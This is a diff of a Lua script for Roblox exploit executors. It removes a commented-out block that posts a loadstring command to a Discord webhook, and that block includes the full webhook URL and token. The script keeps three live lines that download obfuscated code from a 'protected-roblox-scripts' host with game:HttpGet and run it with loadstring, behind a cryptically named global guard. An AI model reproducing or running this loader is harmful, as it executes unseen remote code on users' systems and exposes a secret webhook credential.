@@ -1,9 +1,3 @@
---[[
-
-    local HttpService = game:GetService("HttpService"); local Request = http_request or request or (syn and syn.request); local WEBHOOK = "https://discord.com/api/webhooks/1456921374881878193/ZWiYLNX8CL01osj5qgUBcFO8NYcKqXxIvST9XKP3eClOxNtUmkH_9H5eG7TE6nFS2784"; if Request then Request({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = HttpService:JSONEncode({content = "```loadstring(game:HttpGet(\"https://pastefy.app/tGuaCYCe/raw\"))()```"})}) end
-
-    ]]
-
 
 
 if not _G._30920929389UHIJSSIJSIXIKQJDBWOJ877188172 then
@@ -13,4 +7,4 @@ if not _G._30920929389UHIJSSIJSIXIKQJDBWOJ877188172 then
         loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/41f9cc54277cae1b2a6a3250699365ea"))()
         loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/19aeb4482c2cff891b1953d4a4900b2e"))()
         loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/634b34ee45b417a72d48abbd7e415198"))()
-            end
+end
